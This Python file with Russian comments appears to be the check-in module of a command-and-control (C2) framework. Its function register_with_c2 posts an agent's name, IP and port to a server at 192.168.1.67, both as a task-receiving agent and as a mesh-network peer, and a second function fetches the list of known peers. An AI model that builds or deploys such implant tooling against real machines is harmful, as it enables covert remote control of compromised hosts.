import requests
# from shared.config import SERVER_URL

BOOTSTRAP_URL = "http://192.168.1.67:8000/api"

def register_with_c2(agent_id: str, ip: str, port: int):
    try:
        # 1. Зарегистрироваться как агент (для панели и задач)
        resp_agent = requests.post(
            f"{BOOTSTRAP_URL}/agents/",
            params={"name": agent_id, "ip": ip},  # Используем agent_id как имя
            timeout=5
        )
        if resp_agent.status_code == 200:
            print(f"[{agent_id}] Зарегистрирован как Agent (для задач)")

        # 2. Зарегистрироваться как peer (для mesh-сети)
        resp_peer = requests.post(
            f"{BOOTSTRAP_URL}/peers/register",
            params={"id": agent_id, "ip": ip, "port": port},
            timeout=5
        )
        if resp_peer.status_code == 200:
            print(f"[{agent_id}] Зарегистрирован как Peer (mesh): {ip}:{port}")

    except Exception as e:
        print(f"[{agent_id}] Ошибка при регистрации на C2: {e}")


def get_known_peers():
    try:
        resp = requests.get(f"{BOOTSTRAP_URL}/peers/", timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        print(f"Ошибка при получении списка peers: {e}")
    return []
